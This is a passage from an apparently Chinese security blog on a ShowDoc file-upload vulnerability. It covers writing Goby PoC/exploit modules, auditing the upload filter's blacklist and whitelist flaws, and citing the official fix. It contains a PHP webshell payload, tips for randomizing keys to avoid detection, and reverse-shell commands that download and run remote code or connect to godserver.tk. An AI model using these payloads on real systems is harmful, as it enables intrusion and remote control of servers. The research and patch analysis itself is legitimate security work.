src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%205.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%206.png"></p><h3 id="2-3-2-提高POC的准确性"><a href="#2-3-2-提高POC的准确性" class="headerlink" title="2.3.2 提高POC的准确性"></a>2.3.2 提高POC的准确性</h3><p><strong>问题</strong>：既然可以发出第二次请求，不仅可以触发<code>unlink()</code>函数，是否可以考虑增加一些<code>echo</code>操作进一步提高POC的准确性？</p><p><strong>思路：</strong>在php文件中echo一段随机数，然后第二次请求在响应判断的时候，不仅只是判断响应为200，也匹配是否这段随机数？</p><p>问题解决了，步骤自然清晰。虽然第一次返回匹配到success等字段即可验证POC成功，第二步echo再一下有些多余，但是我想以后肯定某个地方需要用的，先学着。</p><p><strong>已知问题</strong>：由于目前Goby GUI并不支持随机数，所以只能手动输入一个固定数然后进行判断。(Goby团队后续会在GUI中增加随机数选项)</p><h3 id="2-3-3-优化一句话木马"><a href="#2-3-3-优化一句话木马" class="headerlink" title="2.3.3 优化一句话木马"></a>2.3.3 优化一句话木马</h3><p><strong>新需求</strong>：上传冰蝎类的马简单，上传一句话木马类似，但是之前的方式需要在浏览器或冰蝎中打开链接进行操作，有些繁琐。针对一句话木马如果只想在GobyGUI中操作，不需要新打开浏览器中转，肯定更优雅更简洁，那么如何操作？</p><p><strong>需求拆解</strong>：实现动态一句话木马：①在木马文件中动态插入一句话命令②触发木马文件并获取返回值</p><p><strong>问题</strong>：</p><ol><li>如何在上传文件中动态插入参数？查看文档后发现：Goby提供<code>ExpParams</code> 字段来让用户自定义所需传递参数，且和自定义参数逻辑一样，<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>包裹即可在json任意位置使用该变量，比如<code>&lt;?php system(&quot;&#123;&#123;&#123;cmd&#125;&#125;&#125;&quot;);unlink(); ?&gt;</code>,即可实现一句话木马的操作</li><li>如何触发木马并返回值？和前面类似，发送二次请求即可</li></ol><p>Trick：</p><ol><li>Goby发包逻辑是每次先POC后EXP，更改EXP后又要重新走一遍扫描流程，很麻烦，有其他直接验证EXP的操作吗？Goby-cmd.exe脚手架中不仅提供scan操作，也提供exploit操作，且exploit操作支持<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数。</li><li>输入命令<code>goby-cmd -mode runpoc -operation exploit -pocFile exploits\user\a.go -target 127.0.0.1 -params &quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可直接验证EXP。</li><li>在cmd模式下验证EXP无误，切换到GUI界面进行扫描，EXP验证成功！</li></ol><p>已知BUG：</p><ol><li>发包BUG：在json编写EXP需要连续发两个包的情况下，即使内容编写正确的情况下依然可能会检测失败。需要在ExploitSteps的第一个请求的<code>SetVariable</code> 键中额外加入<code>&quot;output|lastbody&quot;</code>值，才会成功执行第二个请求，进而检测成功。（前面《2.3.1 自动删除上传文件》部分用的仅仅只有POC，没用到EXP这一步，所以未产生BUG）</li><li>系统差异BUG：windows下cmd中使用<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数会报错<code>invalid character &#39;\&#39;&#39; looking for beginning of value</code> ，改为<code>&quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可</li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%207.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%208.png"></p><h1 id="3-用Go语言编写Goby的POC"><a href="#3-用Go语言编写Goby的POC" class="headerlink" title="3. 用Go语言编写Goby的POC"></a>3. 用Go语言编写Goby的POC</h1><h2 id="3-1-迈出第一步：学用Go语言"><a href="#3-1-迈出第一步：学用Go语言" class="headerlink" title="3.1 迈出第一步：学用Go语言"></a>3.1 迈出第一步：学用Go语言</h2><p>使用GUI时遇到的痛点</p><ol><li>部分功能缺失：无法使用随机数</li><li>缺少DIY需求：对于返回的<code>\/Public\/Uploads\/2021-06-24\/</code> 这类链接无法直接使用，需要手动剔除转移符号</li><li>黑盒的未知性：单纯看Json并不能掌控POC后续是怎么被载入和利用的，没有Go代码看起来的直观可控</li><li>BUG：不少BUG是因为Json中缺少某个键值，但是判断又很难判断，而Go代码更加可控。</li></ol><p><strong>困难：</strong></p><ol><li>上述Poc难吗？不难，不过是发出请求罢了。</li><li>不会Go语言怎么办？只是发出一个请求罢了，官方也提供了code demo，只需要改下URI即可完成轮子搭建。详见<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#golang-%E4%BB%A3%E7%A0%81%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C">Goby《Vulnerability-writing-guide》之golang-代码录入漏洞手册</a></li></ol><p>虽然我不会Go，但是因为上面的痛点，还是想克服困难，迈出那第一步。</p><p><strong>思路：</strong></p><ol><li>化繁为简：先写POC，POC写好了，EXP自然写好了。</li><li>根据官方的demo，改下POC中的Uri，改下匹配的关键字</li><li>测试即可</li></ol><p>具体不表，造轮子而已。</p><h2 id="3-2-进一步：优化POC"><a href="#3-2-进一步：优化POC" class="headerlink" title="3.2 进一步：优化POC"></a>3.2 进一步：优化POC</h2><h3 id="3-2-1-用Go语言实现高级需求"><a href="#3-2-1-用Go语言实现高级需求" class="headerlink" title="3.2.1 用Go语言实现高级需求"></a>3.2.1 用Go语言实现高级需求</h3><p>刚才只是简单的request，想要完成更高的需求，比如前面Json部分对POC的优化</p><p><strong>问题</strong>：</p><ol><li>Go如何实现两次请求达到删除的效果？把发出请求的代码Copy一次，if第一次成功，发出第二次请求，if第二次请求成功，return true。</li><li>Go如何使用正则？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>regexp.MustCompile()</code> ，百度搜用法，先新建regex.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何拼接变量？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>fmt.Sprintf(&quot;%s&quot;,var）</code> ，百度搜用法，先新建fmt.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何实现随机数？因为前面GUI编写只能固定数，存在被检测特征，仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#goutils">官方文档</a> ，发现其使用<code>RandomHexString()</code>生成随机字符串，将固定数替换为随机数变量即可</li><li>Go能否将冰蝎上传后返回链接自动优化，而不是手动删除转义符号？既然我们可以通过拼接<code>date</code>和<code>file</code> 形成第二次请求的链接，那么我们也可以冰蝎的输出的内容改为这个链接：<code>expResult.Output =fmt.Sprintf(&quot;%s/Public/Uploads/%s/%s&quot;, expResult.HostInfo, date[1], file[1])</code> </li><li>Go能否进一步减少POC特征？前面提及不少网上木马的key为<code>peiqi</code> ,此处也可以利用<code>RandomHexString()</code> 的方式随机生成key，然后在第二次使用后删除该文件，实现一次一密的效果。当然<code>boundary=-------xxxxx</code> 字段也可以通过<code>RandomHexString()</code> 来实现随机性。</li></ol><p>一步步的查看文档、测试，发现Go语言编写POC&amp;EXP时，内容和行为更可控，也能实现更多自定义需求，需要的Go语言基础也不高，个人觉得比目前GUI的Json编写更加方便。（后续Goby团队会改进GUI并实现这些需要用Go才能满足需求）</p><h3 id="3-2-2-执行一句话命令"><a href="#3-2-2-执行一句话命令" class="headerlink" title="3.2.2 执行一句话命令"></a>3.2.2 执行一句话命令</h3><p>Goby红队版本就是执行一句话回显命令的方式</p><p><strong>问题：</strong></p><ol><li>Goby如何自定义参数？前面已经介绍了，在Json中的<code>ExpParams</code> 字段来让用户自定义所需传递参数</li><li>Go中如何获取到自定义参数?查看文档发现，可以使用<code>ss.Params[&quot;cmd&quot;].(string)</code>的形式获取参数</li><li>Go中如何将自定义参数输入到payload中？利用前面提及的<code>fmt.Sprintf(&quot;%s&quot;,var）</code> 方式</li></ol><h3 id="3-2-3-更进一步：直接反弹shell"><a href="#3-2-3-更进一步：直接反弹shell" class="headerlink" title="3.2.3 更进一步：直接反弹shell"></a>3.2.3 更进一步：直接反弹shell</h3><p><strong>想法</strong>：既然可以一句话木马，而大部分时间我们生成一句话木马之后第二步就是反弹shell，那么为什么第二次不直接执行反弹shell，难道不比执行一句话命令好？</p><p><strong>问题</strong>：</p><ol><li>如何实现（思路上）？将一句话木马的paylod部分由自定义参数命令的方式直接改为反弹shell的命令即可</li><li>如何实现（实际操作）？查看Goby提供<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-goby-%E7%9A%84-godserver-%E5%8F%8D%E5%BC%B9-shell">反弹shell的demo</a> 文档，然后魔改为自己需要的即可</li><li>为什么可以反弹shell，但是所上传文件无法自动删除，<code>unlink()</code> 函数没触发？因为先执行命令再执行<code>unlink()</code>函数，而前者shell在反弹过程中堵塞了进程，百度后发现可<a href="https://www.php.net/manual/en/function.exec.php#86329">采取<code>popen()</code>启动子进程</a>的方式。(有趣的是，通过该文档，我了解到可以通过<code>php_uname()</code> 来判断服务器主机系统，进而根据不同系统动态生成payload的操作)（GobyShell只有10分钟存活，也可以保证不会长期驻留服务器进程）</li></ol><p>我先在本地测试PHP载荷可以实现反弹shell的效果(详见下图)，然后再在Go语言中实现。</p><blockquote><p>和go0p师傅交流之后，我发现我的想法是错的：我急于直接看到反弹shell的效果，只是因为我的测试环境允许。在实战情况下，目标可能不出网，Godserver服务器可能有一定的问题等等，导致反弹shell不一定在所有环境下都是可以成功的，所以EXP能使用一句话木马回显就用一句话木马回显，其次才考虑其他验证方式。参考<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AE%AE">《GobyPOC编写建议之其他建议》</a></p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//Goby生成的godserver相关命令</span><br><span class="hljs-comment">//ReverseTCPByPowershell</span><br>powershell IEX (New-<span class="hljs-built_in">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://godserver.tk/ps/rs.ps1&#x27;</span>);rs -H godserver.tk -P <span class="hljs-number">35355</span><br><span class="hljs-comment">//ReverseTCPByBash</span><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-comment">//ReverseTCPByNcBsd</span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc godserver.tk <span class="hljs-number">35355</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br><span class="hljs-comment">//ReverseTCPBySh</span><br><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span>-;exec <span class="hljs-number">1</span>&lt;&gt;<span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span>;sh -i &lt;&amp;<span class="hljs-number">1</span> &gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%209.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2010.png"></p><h2 id="3-3-最终效果"><a href="#3-3-最终效果" class="headerlink" title="3.3 最终效果"></a>3.3 最终效果</h2><p>代码放在仓库：<a href="https://github.com/corp0ra1/showDocDemo">https://github.com/corp0ra1/showDocDemo</a></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.gif"></p><h2 id="3-4-发散思维"><a href="#3-4-发散思维" class="headerlink" title="3.4 发散思维"></a>3.4 发散思维</h2><p>上述操作基本把Goby提供的功能基本都尝试了个遍，就剩下个DNSLOG也尝试一下？比如第二次请求之后不通过返回值判断而是根据DNSLOG的结果？</p><h1 id="4-更进一步-代码审计-TL-DR"><a href="#4-更进一步-代码审计-TL-DR" class="headerlink" title="4. 更进一步-代码审计 TL;DR"></a>4. 更进一步-代码审计 TL;DR</h1><p>上述操作只是完成了漏洞的复现，以及POC&amp;EXP的编写，但是心中还是有疑问</p><ul><li>为什么文件名后缀使用<code>.&lt;&gt;php</code>就可以绕过?</li><li>为什么我尝试<code>.&lt;php</code>的后缀绕过方式不行？</li><li>为什么有这种神奇的绕过方法？</li><li>什么原因导致的？</li></ul><p>十万个为什么，最终促使了我进行代码审计！</p><blockquote><p>不会代码审计，只能一步步的断点跟踪分析，笨办法</p></blockquote><h2 id="4-1-showdoc如何限制文件上传的"><a href="#4-1-showdoc如何限制文件上传的" class="headerlink" title="4.1 showdoc如何限制文件上传的"></a>4.1 showdoc如何限制文件上传的</h2><h3 id="4-1-1-先黑名单检测"><a href="#4-1-1-先黑名单检测" class="headerlink" title="4.1.1 先黑名单检测"></a>4.1.1 先黑名单检测</h3><p>检测文件名中是否包含php字样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2011.png"></p><h3 id="4-1-2-再白名单检测"><a href="#4-1-2-再白名单检测" class="headerlink" title="4.1.2 再白名单检测"></a>4.1.2 再白名单检测</h3><p>检测文件后缀名是否在upload类的<code>$ext</code>数组白名单中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;exts&#x27;</span>]) ? <span class="hljs-literal">true</span> : in_array(strtolower(<span class="hljs-variable">$ext</span>), <span class="hljs-keyword">$this</span>-&gt;exts);<br></code></pre></td></tr></table></figure><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2012.png"></p><h3 id="4-1-3-最后图片内容检测"><a href="#4-1-3-最后图片内容检测" class="headerlink" title="4.1.3 最后图片内容检测"></a>4.1.3 最后图片内容检测</h3><p>仅对图像文件进行进一步检测，其他类型则放行（有些鸡肋）</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2013.png"></p><h2 id="4-2-绕过方法一：畸形后缀绕过"><a href="#4-2-绕过方法一：畸形后缀绕过" class="headerlink" title="4.2 绕过方法一：畸形后缀绕过"></a>4.2 绕过方法一：畸形后缀绕过</h2><h3 id="4-2-1-绕过方式"><a href="#4-2-1-绕过方式" class="headerlink" title="4.2.1 绕过方式"></a>4.2.1 绕过方式</h3><p>文件名为：<code>test.&lt;&gt;php</code></p><h3 id="4-2-2-原理"><a href="#4-2-2-原理" class="headerlink" title="4.2.2 原理"></a>4.2.2 原理</h3><p><code>.&lt;&gt;php</code>的方式绕过了黑名单对<code>.php</code>检测</p><p>而在之后的showdoc\server\ThinkPHP\Library\Think\Upload.class.php 的<code>upload()</code>函数中对文件名使用了<code>strip_tags()</code>函数进行处理，去掉了<code>&lt;&gt;</code>标签，还原后缀名为php。</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2014.png"></p><h3 id="4-2-3-修复方案"><a href="#4-2-3-修复方案" class="headerlink" title="4.2.3 修复方案"></a>4.2.3 修复方案</h3><p>在进行黑名单检测时，先用<code>strip_tags()</code>函数对输入文件名进行处理（有趣的是我在另外一个路径下的同名文件中发现了这种修复方案）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//漏洞版本：showdoc\server\Application\Home\Controller\PageController.class.php</span><br><br>strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br><br><span class="hljs-comment">//另外一个路径下的修复版本：showdoc\server\Application\Api\Controller\PageController.class.php</span><br><br>strstr(strip_tags(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])), <span class="hljs-string">&quot;.php&quot;</span>) <br></code></pre></td></tr></table></figure><h3 id="4-2-4-追问：不是后面还会进行白名单检测吗？"><a href="#4-2-4-追问：不是后面还会进行白名单检测吗？" class="headerlink" title="4.2.4 追问：不是后面还会进行白名单检测吗？"></a>4.2.4 追问：不是后面还会进行白名单检测吗？</h3><blockquote><p>重头戏，这个引发后续一系列问题！</p></blockquote><p>虽然前面绕过了黑名单检测，但是后面还有白名单检测，那么这里怎么绕过的呢？</p><p>赋值问题：后缀的白名单数组赋值给了upload类中的<code>allowExts</code>变量：<code>$upload-&gt;allowExts = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> ，但是检测文件名后缀的时候使用upload类中的<code>exts</code>变量：<code>$this-&gt;config[&#39;exts&#39;]</code> ，错付了值，显而易见，exts变量为空，故绕过了后缀名的check。</p><p>这是开发者在开发时疏漏导致的白名单检测缺陷，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> 即可修复</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2015.png"></p><h2 id="4-3-绕过方法二：修改输入名称"><a href="#4-3-绕过方法二：修改输入名称" class="headerlink" title="4.3 绕过方法二：修改输入名称"></a>4.3 绕过方法二：修改输入名称</h2><h3 id="4-3-1-绕过方式"><a href="#4-3-1-绕过方式" class="headerlink" title="4.3.1 绕过方式"></a>4.3.1 绕过方式</h3><p>将文件输入名称改为<code>editormd-image-file1</code>，如  <code>name=&quot;editormd-image-file1&quot;; filename=&quot;test.php&quot;</code> </p><h3 id="4-3-2-原理"><a href="#4-3-2-原理" class="headerlink" title="4.3.2 原理"></a>4.3.2 原理</h3><p>因为他只检测输入名为<code>editormd-image-file</code> 文件的文件名是否包含php，修改对应的输入名即可。通过此方式同样绕过了黑名单的检测，结合白名单的缺陷，以实现目的</p><p><strong>举一反三</strong>：这也解释了为什么其他场景的文件上传中可以通过修改这个字段名称的方式绕过了文件上传限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="4-3-3-缺陷"><a href="#4-3-3-缺陷" class="headerlink" title="4.3.3 缺陷"></a>4.3.3 缺陷</h3><p>虽然在文件夹中看到文件成功上传，但是返回的文件路径中没有文件名</p><p>查看源码后发现：是因为在返回的文件名中又一次使用到了<code>editormd-image-file</code> ，并通过这个名来获取文件保存路径。由于我们更改了输入名，并不存在<code>editormd-image-file</code> 的键值，故返回了文件名为空。</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2016.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2017.png"></p><h3 id="4-3-4-进一步绕过"><a href="#4-3-4-进一步绕过" class="headerlink" title="4.3.4 进一步绕过"></a>4.3.4 进一步绕过</h3><p>虽然没有返回文件名，但是文件是上传成功的，那么如何知道上传后的文件名？</p><p>跟踪源码，发现文件命名调用了<code>uniqid()</code> 函数，而该函数的定义是基于以微秒计的当前时间，生成一个唯一的 ID。根据函数的定义，那么在极短的时间内发送两个包，那么文件名应该是相近的。</p><p>方法一：第一个正常上传返回路径，第二个修改输入名不返回路径，依据时间递增遍历即可找到，但是爆破不知上限有些盲目。</p><p>方法二：php文件在两个包之间，对应文件名也在两个包时间之间。如下图，需要爆破5位数</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2018.png"></p><h3 id="4-3-5-更进一步"><a href="#4-3-5-更进一步" class="headerlink" title="4.3.5 更进一步"></a>4.3.5 更进一步</h3><p>通过查看<a href="http://document.thinkphp.cn/manual_3_2.html#upload">thinkphp文档</a>后发现，其支持多文件上传。测试后多文件上传后，发现文件处理时间间隔更近，命名更相似，3位数，对应爆破次数不超过4000次，效率更高。</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2019.png"></p><h2 id="4-4-官方修复方案"><a href="#4-4-官方修复方案" class="headerlink" title="4.4 官方修复方案"></a>4.4 官方修复方案</h2><p>修复白名单赋值导致的缺陷即可，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code></p><p><a href="https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd">https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd</a></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2020.png"></p><h2 id="4-5-其他失败尝试"><a href="#4-5-其他失败尝试" class="headerlink" title="4.5 其他失败尝试"></a>4.5 其他失败尝试</h2><h3 id="4-5-1-直接上传php"><a href="#4-5-1-直接上传php" class="headerlink" title="4.5.1 直接上传php"></a>4.5.1 直接上传php</h3><p><strong>原因</strong>：最早跟踪&lt;&gt;的漏洞成因，发现是白名单后缀检测失效导致的，既然白名单失效，为什么不考虑直接上传php</p><p><strong>过程</strong>：测试失败，然后下断点跟踪代码。</p><p><strong>收获</strong>：发现了其还有一层黑名单验证机制</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2021.png"></p><h3 id="4-5-2-strlower通过Unicode字符绕过"><a href="#4-5-2-strlower通过Unicode字符绕过" class="headerlink" title="4.5.2 strlower通过Unicode字符绕过"></a>4.5.2 strlower通过Unicode字符绕过</h3><p>原因：最近打<a href="https://blog.csdn.net/wanmiqi/article/details/117044715">CISCN2021</a>的一道upload题目，遇到在<code>strtolower</code> 进行黑名单匹配时可通过unicode绕过</p><p><strong>过程</strong>：仔细查看后发现我记错了，CTF中题目是<code>mb_strtolowe</code>r，而此处是<code>strtolower</code></p><p><strong>收获</strong>：对<code>strtolower</code>和<code>mb_strtolower</code>理解更深</p><h3 id="4-5-3-htaccess绕过"><a href="#4-5-3-htaccess绕过" class="headerlink" title="4.5.3 .htaccess绕过"></a>4.5.3 .htaccess绕过</h3><p><strong>背景</strong>：黑名单只限制php，phtml可以上传，但无法被解析，那么可以上传<code>.htaccess</code>使之支持解析吗？</p><p><strong>过程</strong>：测试，发现上传的<code>.htaccess</code> 会被重命名为<code>60d150f6ee711.htaccess</code></p><p><strong>结局</strong>：不再发散，点到为止</p><h1 id="5-有趣的溯源"><a href="#5-有趣的溯源" class="headerlink" title="5. 有趣的溯源"></a>5. 有趣的溯源</h1><h2 id="5-1-漏洞起源于CTF"><a href="#5-1-漏洞起源于CTF" class="headerlink" title="5.1 漏洞起源于CTF"></a>5.1 漏洞起源于CTF</h2><ol><li>plzmyy师傅最早通报这个漏洞给<a href="https://github.com/star7th/showdoc/pull/1059%E3%80%82">showdoc官方</a>在2020年的八月</li><li>plzmyy师傅提到了最早出现在RoarCTF2019的赛事中的simple_upload题目<a href="https://www.fuzzer.xyz/2019/10/14/RoarCTF2019">Ethan师傅的WP</a></li><li>Ethan师傅发现&lt;&gt;绕过方法是fuzz出来这个非预期解，而查看绝大部分WP以及<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/simple_upload/writeup">疑似官方的WP</a>中介绍的是利用uniqid()的函数可爆破的点，似乎没注意到这个非预期解。</li><li>Ethan师傅文章中提到疑似0day，引起了我的兴趣，我想分析到底是哪个day？</li></ol><h2 id="5-2-疑似0day"><a href="#5-2-疑似0day" class="headerlink" title="5.2 疑似0day"></a>5.2 疑似0day</h2><ol><li>检索相关关键词，没有发现0day，而且到现在都没有爆出来，离谱！更加吸引了我的兴趣</li><li>搜索引擎限定搜索时间为19年10月RoarCTF开赛之前，发现一个14的<a href="https://www.jb51.net/article/54209.htm">《ThinkPHP文件上传实例教程》</a>一个15年的<a href="http://www.splaybow.com/post/thinkphp-file-upload-sample.html">《ThinkPHP文件上传的实例代码》</a>网页介绍了如何使用ThinkPHP文件上传 